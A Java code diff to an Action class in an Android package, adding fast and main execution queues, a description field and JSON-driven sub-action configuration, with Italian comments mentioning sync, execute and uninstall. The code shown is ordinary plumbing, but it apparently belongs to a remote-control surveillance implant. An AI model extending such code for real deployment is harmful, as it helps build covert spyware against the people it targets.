@@ -10,8 +10,13 @@ package com.android.service.action;
 import java.util.ArrayList;
 import java.util.List;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import com.android.service.GeneralException;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 
 /**
@@ -23,28 +28,41 @@ public class Action {
 	/** The Constant ACTION_NULL. */
 	public static final int ACTION_NULL = -1;
 
+	/** Coda per tutte le action che non interagiscono con il core */
+	public static final int FAST_QUEUE = 0;
+
+	/** Coda per la sync, execute e uninstall */
+	public static final int MAIN_QUEUE = 1;
+
+	public static final int NUM_QUEUE = 2;
 	/** Action array. */
 	private final List<SubAction> list;
 
 	/** Action ID. */
 	private final int actionId;
 
+	private final String desc;
+
+	private int queue = FAST_QUEUE;
+
 	/**
 	 * Action constructor.
 	 * 
 	 * @param id
 	 *            : action id
+	 * @param desc
 	 * @param num
 	 *            : number of subactions
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public Action(final int id) {
+	public Action(final int id, String desc) {
 		if (Cfg.DEBUG) {
 			Check.asserts(id >= 0, "Invalid id"); //$NON-NLS-1$
 		}
 
 		this.actionId = id;
+		this.desc = desc;
 		list = new ArrayList<SubAction>();
 	}
 
@@ -71,23 +89,39 @@ public class Action {
 	 * 
 	 * @param type
 	 *            the type
-	 * @param params
+	 * @param jsubaction
 	 *            the params
 	 * @throws GeneralException
 	 *             the RCS exception
+	 * @throws JSONException
+	 * @throws ConfigurationException
 	 */
-	public boolean addSubAction(final int typeId, final byte[] params) throws GeneralException {
+	public boolean addSubAction(final ConfAction actionConf) throws GeneralException, ConfigurationException {
 
-		if (typeId != 0) {
-			final SubAction sub = SubAction.factory(typeId, params);
+		if (actionConf.getType() != null) {
+			final SubAction sub = SubAction.factory(actionConf.getType(), actionConf);
+			if (sub == null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Error (addSubAction): unknown type: " + actionConf.getType());//$NON-NLS-1$
+				}
+				return false;
+			}
 			list.add(sub);
+			if (sub instanceof SubActionSlow) {
+				setQueue(MAIN_QUEUE);
+			}
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (addSubAction): unknown type Id = " + typeId) ;//$NON-NLS-1$
+				Check.log(TAG + " Error (addSubAction): null type ");//$NON-NLS-1$
 			}
 			return false;
 		}
+	}
+
+	private void setQueue(int queue) {
+		this.queue = queue;
+
 	}
 
 	/**
@@ -118,5 +152,17 @@ public class Action {
 
 	public SubAction[] getSubActions() {
 		return list.toArray(new SubAction[] {});
+	}
+
+	public int getQueue() {
+		return queue;
+	}
+
+	public String getDesc() {
+		return desc;
+	}
+
+	public String toString() {
+		return getId() + " [" + getDesc().toUpperCase() + "] qq: " + getQueue();
 	}
 }
